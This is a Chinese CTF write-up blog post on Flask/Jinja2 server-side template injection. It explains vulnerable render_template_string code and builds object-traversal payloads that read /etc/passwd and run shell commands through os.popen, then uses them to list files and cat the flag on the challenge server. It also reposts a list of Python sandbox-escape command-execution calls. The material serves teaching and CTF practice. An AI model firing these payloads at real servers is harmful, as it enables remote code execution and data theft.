---
layout:     post               # 使用的布局（不需要改）
title:      Web_python_template_injection    # 标题 
subtitle:    攻防世界   #副标题
date:       2020-07-18         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - CTF
  
---

## 前置知识

先把一些基础知识了解一哈子。

## flask基础

在学习SSTI之前，先把flask的运作流程搞明白。这样有利用更快速的理解原理。

#### 路由

先看一段代码

```
from flask import flask 
@app.route('/index/')
def hello_word():
    return 'hello word'
```

route装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问`http://127.0.0.1：5000/index`的时候，flask会返回`hello word`。

#### 渲染方法

flask的渲染方法有`render_template`和`render_template_string`两种。

`render_template()`是用来渲染一个指定的文件的。使用如下

	return render_template('index.html')

`render_template_string`则是用来渲染一个字符串的。SSTI与这个方法密不可分。

使用方法如下

	html = '<h1>This is index page</h1>'	
	return render_template_string(html)

#### 模板

flask是使用jinja2来作为渲染引擎的。

在网站的根目录下新建templates文件夹，这里是用来存放html文件。也就是模板文件。

`test.py` ：

```
from flask import Flask,url_for,redirect,render_template,render_template_string
@app.route('/index/')
def user_login():
    return render_template('index.html')
```

`/templates/index.html` :

	<h1>This is index page</h1>

访问`127.0.0.1:5000/index/`的时候，flask就会渲染出index.html的页面。

模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。

例子:

`test.py` :

```
from flask import Flask,url_for,redirect,render_template,render_template_string
@app.route('/index/')
def user_login():
    return render_template('index.html',content='This is index page.')
```

`/templates/index.html` :

`<h1>{{content}}</h1>`


这个时候页面仍然输出`This is index page`。

{{}}在Jinja2中作为变量包裹标识符。

## 模板注入

不正确的使用flask中的render_template_string方法会引发SSTI。那么是什么不正确的代码呢？

#### xss利用

存在漏洞的代码：

```
@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)
    return render_template_string(html)
```

这段代码存在漏洞的原因是数据和代码的混淆。代码中的code是用户可控的，会和html拼接后直接带入渲染。

尝试构造code为一串js代码。我们可以看到它弹窗了。

![UghIIK.png](https://s1.ax1x.com/2020/07/18/UghIIK.png)

将代码改为如下：

```
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
```

继续尝试,它没有弹窗而是直接将代码输出到浏览器。

![Ugh7GD.png](https://s1.ax1x.com/2020/07/18/Ugh7GD.png)

可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。

模板注入并不局限于xss，它还可以进行其他攻击。

#### SSTI文件读取/命令执行

#### 基础知识

在Jinja2模板引擎中，{{}}是变量包裹标识符。{{}}并不仅仅可以传递变量，还可以执行一些简单的表达式。

这里还是用上文中存在漏洞的代码

```
@app.route('/test/')
def test():
    code = request.args.get('id')
    html = '''
        <h3>%s</h3>
    '''%(code)
    return render_template_string(html)
```

构造参数{{2*4}}，结果如下:

![Ug4VZq.png](https://s1.ax1x.com/2020/07/18/Ug4VZq.png)

可以看到表达式被执行了。

在flask中也有一些全局变量。

![Ug4NFK.png](https://s1.ax1x.com/2020/07/18/Ug4NFK.png)

#### 文件包含

看了师傅们的文章，是通过python的对象的继承来一步步实现文件读取和命令执行的的。顺着师傅们的思路，再理一遍。

找到父类<type 'object'>-->寻找子类-->找关于命令执行或者文件操作的模块。

几个魔术方法

```
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```

1.获取字符串的类对象

```
>>> ''.__class__
<type 'str'>
```

ps： 这里的引号指示代表一个类型。或者可以使用`[]`,出来之后就为`<class 'list'>`

2.寻找基类

```
>>> ''.__class__.__mro__
(<type 'str'>, <type 'basestring'>, <type 'object'>)
```

或者这样

```
>>> ''.__class__.__base__
<type 'basestring'>
```
另一个:

```
>>> [].__class__.__base__
<type 'object'>
```

我们发现其中的些许区别。

上面是python2,

py3为:

```
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
```
```
>>> ''.__class__.__base__
<class 'object'>
```



3.寻找可用引用

```
>>> ''.__class__.__mro__[2].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>,
<type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>
, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float
'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type
 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instance
method'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <
type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'P
yCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_in
fo'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type
'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImpo
rter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.Warning
Message'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <
class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll
.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site
._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <
class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.item
getter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteC
odec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <
type 'MultibyteStreamWriter'>]
```

可以看到有一个`<type 'file'>`.

python3是这样：

```
>>> ''.__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearra
y'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class '
super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'd
ict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iter
ator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <c
lass 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumer
ate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_or_meth
od'>, <class 'method'>, <class 'function'>, <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>,
 <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>, <class 'member_descriptor'>, <class 'typ
es.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <c
lass 'classmethod_descriptor'>, <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class
'pickle.PickleBuffer'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'EncodingMa
p'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_
array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'it
ems'>, <class 'Context'>, <class 'ContextVar'>, <class 'Token'>, <class 'Token.MISSING'>, <class 'moduledef'>, <class
 'module'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_
importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>,
 <class '_frozen_importlib.BuiltinImporter'>, <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <cla
ss '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_thread.
lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importli
b_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._Name
spacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>,
<class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.Inc
rementalNewlineDecoder'>, <class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class 'PyHKEY'>, <class 'zipimport.zi
pimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'
>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '
MultibyteCodec'>, <class 'MultibyteIncrementalEncoder'>, <class 'MultibyteIncrementalDecoder'>, <class 'MultibyteStre
amReader'>, <class 'MultibyteStreamWriter'>, <class '_abc_data'>, <class 'abc.ABC'>, <class 'dict_itemiterator'>, <cl
ass 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class
 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>, <class 'bytearray_iterator'>, <cla
ss 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class
 'range_iterator'>, <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc
.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '
os._AddedDllDirectory'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._He
lper'>]
```

4.利用

	''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()

![UgolQg.png](https://s1.ax1x.com/2020/07/18/UgolQg.png)

可以看到读取到了文件。

#### 命令执行

继续看命令执行payload的构造，思路和构造文件读取的一样。

寻找包含os模块的脚本

```
#!/usr/bin/env python
# encoding: utf-8
for item in ''.__class__.__mro__[2].__subclasses__():
    try:
         if 'os' in item.__init__.__globals__:
             print num,item
         num+=1
    except:
        print '-'
        num+=1
```

输出

```
-
71 <class 'site._Printer'>
-
-
-
-
76 <class 'site.Quitter'>
```

payload:

	''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')

构造paylaod的思路和构造文件读取的是一样的。只不过命令执行的结果无法直接看到，需要利用curl将结果发送到自己的vps或者利用ceye)

以上内容转载自： [https://www.freebuf.com/column/187845.html](https://www.freebuf.com/column/187845.html)

感谢作者写了这么好的一篇文章。

我们再来看看这位大佬写的。https://blog.csdn.net/zss192/article/details/104200493

下面我把他内容也转载一下。

## python沙箱逃逸

#### 一些常见的寻找特殊模块的方式

```
__class__:获得当前对象的类
__bases__:列出其基类
__mro__ :列出解析方法的调用顺序，类似于bases
__subclasses__()：返回子类列表
__dict__ ： 列出当前属性/函数的字典
__init__  : 一般跟在类的后面，相当于实例化这个类
__globals__ : 以字典的形式返回函数所在的全局命名空间所定义的全局变量
```

这个上面已经有了，但是再写一遍，加强记忆。

```
>>> [].__class__
<type 'list'>
```

python的内置对象有一个class属性来存储类型，我们可以使用base属性往上找他的父类

```
>>> [].__class__.__base__
<type 'object'>
```

得到object对象后之后我们可通过属性subclasses来查看object的所有子类

```
>>> [].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]

```

而在这所有子类中file类可读取文件，我们可以通过index查找file类的位置（file类只在python2存在）

```
>>> [].__class__.__base__.__subclasses__().index(file)
40
```

我们可用下列代码读取目标文件

```
[].__class__.__base__.__subclasses__()[40]('./flag.txt').read()
```

我们可用下列代码引用指定模块（eg:os模块）

```
>>> [].__class__.__base__.__subclasses__()[71].__init__.__globals__['os']
<module 'os' from '/usr/lib/python2.7/os.pyc'>

```

上面的语句相当于os我们便可像往常用os来使用了，比如使用os模块的listdir

```
[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir("./")

```

上面语句等同于使用os.listdir("./")

#### Python中可以利用的方法和模块

1.任意代码或者命令执行

#### _ import _()函数

	__import__("os").system("ls")

#### timeit模块

```
import timeit
timeit.timeit("__import__('os').system('ls')",number=1)
```

#### exec()，eval()，execfile()，compile()函数

```
eval('__import__("os").system("ls")')
exec("a+1")
compile('a = 1 + 2', '<string>', 'exec')

```

注意：execfile()只存在于Python2，Python3没有该函数


#### platform模块

```
import platform
platform.popen('dir').read()

```

#### os模块

```
import os
os.system('ls')
os.popen("ls").read()

```

#### subprocess模块

```
import subprocess
subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
```

#### importlib模块

import importlib
importlib.import_module('os').system('ls')
#Python3可以，Python2没有该函数
importlib.__import__('os').system('ls')

#### 文件操作

file()函数

```
file('test.txt').read()
#注意：该函数只存在于Python2，Python3不存在

```

open()函数

	open('text.txt').read()


codecs模块

```
import codecs
codecs.open('test.txt').read()

```

转载完了，开始做题吧。

## 开始操作

根据提示内容，是python模板注入。

#### 判断注入

尝试{{2+3}}看看{{}}内的代码是否被执行

![UgqOsO.png](https://s1.ax1x.com/2020/07/18/UgqOsO.png)

由上图可知代码被执行确实存在模板注入。

#### 获取类对象

输入`{{[].__class__}}`

页面返回：

	URL http://220.249.52.133:44238/<type 'list'> not found

#### 寻找基类

输入`{{[].__class__.__base__}}`

页面回显：

	URL http://220.249.52.133:44238/<type 'object'> not found

#### 寻找可用引用模块

输入`{{[].__class__.__base__.__subclasses__()}}`

页面回显：

	URL http://220.249.52.133:44238/[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'functools.partial'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'collections.deque'>, <type 'deque_iterator'>, <type 'deque_reverse_iterator'>, <type 'itertools.combinations'>, <type 'itertools.combinations_with_replacement'>, <type 'itertools.cycle'>, <type 'itertools.dropwhile'>, <type 'itertools.takewhile'>, <type 'itertools.islice'>, <type 'itertools.starmap'>, <type 'itertools.imap'>, <type 'itertools.chain'>, <type 'itertools.compress'>, <type 'itertools.ifilter'>, <type 'itertools.ifilterfalse'>, <type 'itertools.count'>, <type 'itertools.izip'>, <type 'itertools.izip_longest'>, <type 'itertools.permutations'>, <type 'itertools.product'>, <type 'itertools.repeat'>, <type 'itertools.groupby'>, <type 'itertools.tee_dataobject'>, <type 'itertools.tee'>, <type 'itertools._grouper'>, <type '_thread._localdummy'>, <type 'thread._local'>, <type 'thread.lock'>, <type 'Struct'>, <type '_json.Scanner'>, <type '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <type 'time.struct_time'>, <class 'threading._Verbose'>, <type 'cPickle.Unpickler'>, <type 'cPickle.Pickler'>, <type 'cStringIO.StringO'>, <type 'cStringIO.StringI'>, <class 'string.Template'>, <class 'string.Formatter'>, <type '_ssl._SSLContext'>, <type '_ssl._SSLSocket'>, <class 'socket._closedsocket'>, <type '_socket.socket'>, <type 'method_descriptor'>, <class 'socket._socketobject'>, <class 'socket._fileobject'>, <class 'urlparse.ResultMixin'>, <class 'contextlib.GeneratorContextManager'>, <class 'contextlib.closing'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'jinja2.nodes.EvalContext'>, <type '_hashlib.HASH'>, <class 'jinja2.nodes.Node'>, <type '_random.Random'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContextBase'>, <class 'jinja2.runtime.LoopContextIterator'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'numbers.Number'>, <class 'decimal.Decimal'>, <class 'decimal._ContextManager'>, <class 'decimal.Context'>, <class 'decimal._WorkRep'>, <class 'decimal._Log10Memoize'>, <type '_ast.AST'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <type '_io._IOBase'>, <type '_io.IncrementalNewlineDecoder'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'logging.LogRecord'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <type 'datetime.date'>, <type 'datetime.timedelta'>, <type 'datetime.time'>, <type 'datetime.tzinfo'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'email.LazyImporter'>, <class 'calendar.Calendar'>, <class 'werkzeug.urls.Href'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.middleware.dispatcher.DispatcherMiddleware'>, <class 'werkzeug.middleware.http_proxy.ProxyMiddleware'>, <class 'werkzeug.middleware.shared_data.SharedDataMiddleware'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'werkzeug.exceptions.Aborter'>, <class 'uuid.UUID'>, <type 'CArgObject'>, <type '_ctypes.CThunkObject'>, <type '_ctypes._CData'>, <type '_ctypes.CField'>, <type '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <type 'select.epoll'>, <class 'subprocess.Popen'>, <class 'itsdangerous._json._CompactJSON'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'ast.NodeVisitor'>, <class 'difflib.HtmlDiff'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <type 'unicodedata.UCD'>, <type 'array.array'>, <type 'method-wrapper'>, <class 'jinja2.debug.TracebackFrameProxy'>, <class 'jinja2.debug.ProcessedTraceback'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>] not found

好多可以引用的。

服务器回复了很长的一个列表，我就不列举了，从其中可以找到我们想要的`os`所在的`site._Printer`类，它在列表的第七十二位。(数组从0开始)

验证一下

输入`{{[].__class__.__base__.__subclasses__()[71]}}`

回显：

	URL http://220.249.52.133:44238/<class 'site._Printer'> not found

#### 引用os

输入`{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os']}}`

回显：

	URL http://220.249.52.133:44238/<module 'os' from '/usr/lib/python2.7/os.pyc'> not found

三输入`{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
`查看目录

回显：

	URL http://220.249.52.133:44238/fl4g index.py not found

发现`fl4g`,那么此文件就极有可能藏有flag.

#### 查看flag

输入`{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat "fl4g"').read()}}
`

页面成功回显flag:

	URL http://220.249.52.133:44238/ctf{f22b6844-5169-4054-b2a0-d95b9361cb57} not found